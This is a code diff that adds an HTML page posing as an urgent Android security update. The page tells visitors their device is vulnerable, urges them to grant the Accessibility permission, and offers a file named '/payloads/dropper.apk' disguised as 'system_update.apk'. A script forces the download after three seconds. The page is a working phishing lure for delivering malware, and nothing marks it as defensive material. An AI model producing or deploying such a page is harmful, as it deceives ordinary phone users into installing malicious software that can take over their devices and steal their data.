@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🚨 Android Security Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { 
+            margin:0; padding:40px 20px; background:linear-gradient(135deg,#ff0000,#cc0000);
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
+            text-align:center; color:white;
+        }
+        .logo { font-size:48px; margin-bottom:20px; }
+        .btn { 
+            display:inline-block; background:#00ff00; color:black; 
+            padding:20px 40px; font-size:24px; font-weight:bold; 
+            border-radius:50px; text-decoration:none; box-shadow:0 10px 30px rgba(0,0,0,0.5);
+            animation:pulse 2s infinite;
+        }
+        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.05);} }
+        .warning { background:#ffaa00; color:black; padding:15px; border-radius:10px; margin:20px 0; }
+    </style>
+</head>
+<body>
+    <div class="logo">🚨</div>
+    <h1>Critical Security Update Required</h1>
+    <p style="font-size:18px;">Your device detected security vulnerability.<br>
+    Install patch immediately to continue.</p>
+    
+    <div class="warning">
+        ⚠️ Allow "Accessibility" permission during install
+    </div>
+    
+    <a href="/payloads/dropper.apk" class="btn" download="system_update.apk">
+        📱 INSTALL PATCH NOW
+    </a>
+    
+    <script>
+        // Auto-download después 3s
+        setTimeout(() => {
+            window.location.href = '/payloads/dropper.apk';
+        }, 3000);
+    </script>
+</body>
+</html>
